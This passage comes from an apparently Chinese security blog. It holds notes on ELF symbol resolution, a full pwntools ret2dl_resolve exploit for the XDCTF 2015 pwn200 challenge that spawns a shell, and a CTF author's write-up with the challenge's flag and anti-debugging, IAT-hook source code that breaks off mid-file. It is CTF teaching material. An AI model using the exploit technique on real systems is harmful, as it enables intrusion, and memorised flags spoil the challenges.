Elf32_Sym;</span><br></pre></td></tr></table></figure><p>对于st_info段</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_BIND(val)      (((unsigned char) (val)) &gt;&gt; 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_TYPE(val)      ((val) &amp; 0xf)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_INFO(bind, type)   (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span></span><br></pre></td></tr></table></figure><p>对于pwn来说，只考虑st_name, st_info即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">st_name = 被调用函数名字符串地址相对于.dynstr段的偏移</span><br><span class="line">st_info = (<span class="number">0x1</span> &lt;&lt; <span class="number">4</span>) + <span class="number">0x2</span> <span class="comment">// (STB_GLOBAL &lt;&lt; 4) + STT_FUNC</span></span><br><span class="line"><span class="comment">// 如果要绑定函数 st_info = 0x12 例如:__libc_start_main</span></span><br><span class="line"><span class="comment">// 如果要绑定一般的指针 st_info = 0x11 例如:stdin</span></span><br><span class="line"><span class="comment">// 如果要绑定变量 st_info = 0x20 例如:__gmon_start__</span></span><br></pre></td></tr></table></figure><p>在IDA中看到的.dynsym和.dynstr如下</p><img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220407201304838.png" class="" title="image-20220407201304838"><p>导入符号的解析需要重定位，每个重定位项都是Elf_Rel结构体的实例，这些项又共同组成了.rel.plt段（用于导入函数）和.rel.dyn段（用于导入全局变量）。Elf_Rel的结构如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;        /<span class="number">4</span>字节* Address */</span><br><span class="line">  Elf32_Word    r_info;          /<span class="number">4</span>字节* Relocation type <span class="keyword">and</span> symbol index */</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><p>对于r_offset项，是GOT表对应项的地址，r_info的高位3个字节用于标识该符号在.dymsym段的位置，即无符号下标，低1个字节是type，如果是6则是变量，为7则为函数，在IDA中看到的.rel.plt和.rel.dyn如图</p><img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220407203119482.png" class="" title="image-20220407203119482"><p>_dl_runtime_resolve()函数有2个参数，第一个参数是link_map对象的地址，第二个参数是导入函数的标识（Elf_Rel在.rel.plt段中的偏移），函数参数link_map_obj用于获取解析导入函数所需的信息，参数reloc_index标识了解析哪一个导入函数。</p><p>符号解析过程如图所示,这里要注意下32位和64位程序结构体会有所区别，而且这个.dl_runtime_resolve的第二个参数，对于32位程序是Elf_Rel在.rel.plt的偏移，对于64位程序是对应Elf_Rel在.rel.plt的索引</p><img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220407205805778.png" class="" title="image-20220407205805778"><h3 id="2种攻击场景"><a href="#2种攻击场景" class="headerlink" title="2种攻击场景"></a>2种攻击场景</h3><p>RELRO保护机制会影响延迟绑定，因此也会影响retdl_resolve:</p><ul><li>Partial RELRO: 包括.dynamic段在内的一些段会被标识为只读</li><li>Full RELRO: 在Partial RELRO的基础上，禁用延迟绑定，即所有的导入符号在加载时就被解析，.got.plt段被完全初始化为目标函数的地址，并标记为只读</li></ul><p>下面来看2个简单的攻击场景</p><ol><li>关闭RELRO，.dynamic可写，因为动态装载器是通过.dynamic段的DT_STRTAB条目来获取.dynstr段的地址，所以我们可以修改DT_STRTAB来使其指向一个伪造的.dynstr段，在那里伪造假的字符串，这样在执行printf的时候，可以执行execve</li></ol><img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220407210853008.png" class="" title="image-20220407210853008"><ol start="2"><li>开启Partial RELRO保护，使.dynamic段不可写，我们知道_dl_runtime_resolve的第二个参数是对应Elf_Rel相对.rel.plt的偏移，当这个数字非常大的时候，会超出.rel.plt段，我们使其正好落在.bss段，在那里伪造一个Elf_Rel，使r_offset的值指向一个可写的内存地址（用于保存解析后的地址），构造r_info。使其指向一个位于它后面的Elf_Sym，然后Elf_Sym中的st_name指向它后面的函数名字符串</li></ol><img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220407211218286.png" class="" title="image-20220407211218286"><h3 id="XDCTF-2015-pwn200"><a href="#XDCTF-2015-pwn200" class="headerlink" title="XDCTF 2015:  pwn200"></a>XDCTF 2015:  pwn200</h3><img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220411100012776.png" class="" title="image-20220411100012776"><p>IDA打开分析，在这个位置存在栈溢出漏洞，思路是在这个地方利用stack pivot将栈转移到bss段，然后在.bss段伪造Elf_Rel，Elf_Sym和函数名</p><p>EXP为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;pwn200&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;pwn200&quot;</span>)</span><br><span class="line">io.recvline(<span class="string">&quot;2015~!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pppr_addr = <span class="number">0x080485cd</span></span><br><span class="line">pop_ebp_addr = <span class="number">0x08048453</span></span><br><span class="line">leave_ret_addr = <span class="number">0x08048481</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt_0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">bss_addr = elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr + <span class="number">0x800</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stack_pivot</span>():</span></span><br><span class="line">    payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>       <span class="comment"># buf</span></span><br><span class="line">    payload1 += p32(read_plt)   <span class="comment"># return address</span></span><br><span class="line">    payload1 += p32(pppr_addr)</span><br><span class="line">    payload1 += p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">200</span>)</span><br><span class="line">    payload1 += p32(pop_ebp_addr) + p32(bss_addr) <span class="comment"># ebp</span></span><br><span class="line">    payload1 += p32(leave_ret_addr)</span><br><span class="line">    </span><br><span class="line">    io.send(payload1)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    r_sym = (bss_addr + <span class="number">40</span> - dynsym) // <span class="number">0x10</span></span><br><span class="line">    r_type = <span class="number">0x7</span></span><br><span class="line">    r_info = (r_sym &lt;&lt; <span class="number">8</span>) + (r_type &amp; <span class="number">0xff</span>)</span><br><span class="line">    fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">    st_name = bss_addr + <span class="number">56</span> - dynstr        <span class="comment">#&#x27;system\x00\x00&#x27; addr</span></span><br><span class="line">    st_bind = <span class="number">0x1</span></span><br><span class="line">    st_type = <span class="number">0x2</span></span><br><span class="line">    st_info = (st_bind &lt;&lt; <span class="number">4</span>) + (st_type &amp; <span class="number">0xf</span>)</span><br><span class="line">    fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(st_info)</span><br><span class="line"></span><br><span class="line">    reloc_index = bss_addr + <span class="number">28</span> - rel_plt<span class="comment"># offset</span></span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">b&#x27;AAAA&#x27;</span> <span class="comment"># ebp</span></span><br><span class="line">    payload2 += p32(plt_0)</span><br><span class="line">    payload2 += p32(reloc_index)        <span class="comment"># call system</span></span><br><span class="line">    payload2 += <span class="string">b&#x27;AAAA&#x27;</span></span><br><span class="line">    payload2 += p32(bss_addr + <span class="number">80</span>)<span class="comment"># 参数/bin/sh的位置</span></span><br><span class="line">    payload2 += <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span></span><br><span class="line">    payload2 += fake_reloc</span><br><span class="line">    payload2 += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>            <span class="comment"># 到此 payload2为 40 bytes</span></span><br><span class="line"></span><br><span class="line">    payload2 += fake_sym        <span class="comment"># 到此 payload2为 56 bytes</span></span><br><span class="line">    payload2 += <span class="string">b&quot;system\x00\x00&quot;</span></span><br><span class="line">    payload2 = payload2.ljust(<span class="number">80</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    payload2 += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload2 = payload2.ljust(<span class="number">100</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    io.sendline(payload2)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    stack_pivot()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure><p>注意！：<code>bss_addr = elf.get_section_by_name(&#39;.bss&#39;).header.sh_addr + 0x800</code> 这个地方卡了好久，要+0x800左右的数据才能跑通，加的少了估计会有其他函数也用到这个内存的数据，会冲突，导致跑不通</p>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 读书笔记 </tag>
            
            <tag> 《CTF竞赛权威指南-pwn篇》 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022miniLctf_RE出题_twin</title>
      <link href="/2022/04/10/2022_miniL%E5%87%BA%E9%A2%98RE-zsky/"/>
      <url>/2022/04/10/2022_miniL%E5%87%BA%E9%A2%98RE-zsky/</url>
      
        <content type="html"><![CDATA[<h2 id="目录文件"><a href="#目录文件" class="headerlink" title="目录文件"></a>目录文件</h2><ol><li>RE.exe        最终的题目文件</li><li>resexe .bak  这是进程2的PE文件，将其加密后存放在了RE.exe的资源段</li></ol><p>链接：<a href="https://pan.baidu.com/s/1gEOMjqnrdsdoZUPE0rAknw">https://pan.baidu.com/s/1gEOMjqnrdsdoZUPE0rAknw</a><br>提取码：r5qi </p><hr><h2 id="出题思路及考察知识点"><a href="#出题思路及考察知识点" class="headerlink" title="出题思路及考察知识点"></a>出题思路及考察知识点</h2><h3 id="出题思路"><a href="#出题思路" class="headerlink" title="出题思路"></a>出题思路</h3><p>出了一道多进程的题目，进程1在TLS_CALLBACK0(Reason为DLL_PROCESS_ATTACH)  的时候输入FLAG，如果没有调试，就动态添加TLS_CALLBACK1</p><p>这时候EIP来到了 TLS_CALLBACK1(Reason为DLL_PROCESS_ATTACH ）， 在其中HOOK掉WriteFile函数，然后ExitProcess()</p><p>EIP来到了 TLS_CALLBACK0(Reason为DLL_PROCESS_DETACH) ， 将进程2释放出来并启动，在进程2中对flag的前半段进行验证，进程1通过进程2的ExitCode来验证flag的前半段是否正确，如果正确则验证flag 的后半段。</p><p>进程1采用的算法就是普通的XXTEA，而进程2采用的是魔改XXTEA（因为如果不调试就HOOK 了WriteFile函数， 在HOOK后的WriteFile函数中修改了解密出来的进程2的PE文件的几个汇编代码，将 xxtea中的 &gt;&gt; 5改为了 &gt;&gt;6）</p><h3 id="考察知识点"><a href="#考察知识点" class="headerlink" title="考察知识点"></a>考察知识点</h3><p>IAT-HOOK技术， TLS反调试，多进程通信, 去除简单的花指令等。</p><hr><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>flag为: <code>miniLctf&#123;cbda59ff59e3e90c91c02e9b40b78b&#125;</code></p><hr><h2 id="程序源码"><a href="#程序源码" class="headerlink" title="程序源码"></a>程序源码</h2><h3 id="进程1"><a href="#进程1" class="headerlink" title="进程1"></a>进程1</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最终版源码</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;resource.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag : miniLctf&#123;cbda59ff59e3e90c91c02e9b40b78b&#125;,长度为40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//WriteFile函数指针，后面HOOK的时候用</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* PWRITEFILE)</span><span class="params">(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数声明区</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxtea_enc</span><span class="params">(DWORD* v, <span class="keyword">int</span> n, DWORD <span class="keyword">const</span> key[<span class="number">4</span>])</span></span>;<span class="comment">//XXTEA 加密</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_res</span><span class="params">()</span></span>;<span class="comment">//保存资源文件</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debuger_main_loop</span><span class="params">(<span class="keyword">char</span>* name, <span class="keyword">void</span>* ppi)</span></span>;<span class="comment">//调试器主循环</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">MyWriteFile</span><span class="params">(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)</span></span>;<span class="comment">//MyWriteFile函数</span></span><br><span class="line"><span class="function">BOOL <span class="title">SetIATHook</span><span class="params">(DWORD dwOldFuncAddr, DWORD dwNewFuncAddr, HANDLE hApiModule)</span></span>;<span class="comment">//导入表HOOK</span></span><br><span class="line"><span class="function">BOOL <span class="title">UnIATHook</span><span class="params">(DWORD dwOldFuncAddr, DWORD dwNewFuncAddr, HANDLE hApiModule)</span></span>;<span class="comment">//导入表UNHOOK</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">decstring</span><span class="params">(<span class="keyword">char</span> * str)</span></span>;<span class="comment">//真正的字符串都被加密了，防止F12找到关键点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_console</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* szMsg)</span></span>;<span class="comment">//在TLS中用printf有可能失败</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> NTAPI <span class="title">TLS_CALLBACK1</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span>;<span class="comment">//TLS回调函数1</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> NTAPI <span class="title">TLS_CALLBACK2</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span>;<span class="comment">//TLS回调函数2</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dec_res</span><span class="params">(<span class="keyword">char</span>* buffer, <span class="keyword">int</span> len)</span></span>;<span class="comment">//解密资源文件</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nouse</span><span class="params">()</span></span>;<span class="comment">//对tls进行操作，否则编译的时候tls结构体没有编译进去</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//全局变量区</span></span><br><span class="line">PWRITEFILE g_dwOldFuncAddr;<span class="comment">//H0OK的时候保存旧函数地址</span></span><br><span class="line">DWORD g_dwNewFuncAddr;<span class="comment">//HOOK的时候保存新函数地址</span></span><br><span class="line">DWORD g_dwIATHookFlag = FALSE;<span class="comment">//刚开始是没有HOOK的</span></span><br><span class="line">HMODULE hAPIModule;<span class="comment">//指向要HOOK的API所在的DLL文件的基址</span></span><br><span class="line">DWORD DELTA = <span class="number">0x9E3779B9</span>;<span class="comment">//XXTEA加密的DELTA</span></span><br><span class="line">DWORD xxteaKey[] = &#123; <span class="number">0x12</span>,<span class="number">0x34</span>,<span class="number">0x56</span>,<span class="number">0x78</span> &#125;;<span class="comment">//XXTEA加密所需的KEY</span></span><br><span class="line"><span class="keyword">char</span> enc_flag2[<span class="number">20</span>] = &#123; <span class="number">0x21</span>, <span class="number">0xa9</span>, <span class="number">0x21</span>, <span class="number">0x90</span>, <span class="number">0x60</span>, <span class="number">0x30</span>, <span class="number">0x3b</span>, <span class="number">0xf5</span>, <span class="number">0x4e</span>, <span class="number">0xa8</span>, <span class="number">0x88</span>, <span class="number">0x8e</span>, <span class="number">0xd5</span>, <span class="number">0x5a</span>, <span class="number">0x63</span>, <span class="number">0x43</span>, <span class="number">0x39</span>, <span 